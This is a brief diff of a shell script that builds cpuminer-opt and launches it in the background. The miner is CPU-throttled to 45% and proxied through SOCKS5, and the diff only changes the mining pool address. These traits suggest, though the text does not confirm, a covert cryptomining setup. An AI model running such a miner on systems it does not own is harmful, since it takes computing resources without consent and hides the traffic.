@@ -5,4 +5,4 @@ cd cpuminer-opt
 chmod +x *
 ./build.sh
 make
-cpulimit --exe cpuminer --limit 45 -b && ./cpuminer -a yescryptr16 -o stratum+tcp://cryply.luckypool.org:9999 -u tuandz.tuandz01 -p x -x socks5://45.76.4.214:6651 --background
+cpulimit --exe cpuminer --limit 45 -b && ./cpuminer -a yescryptr16 -o stratum+tcp://zoi-pool3.chainsilo.com:3032 -u tuandz.tuandz01 -p x -x socks5://45.76.4.214:6651 --background
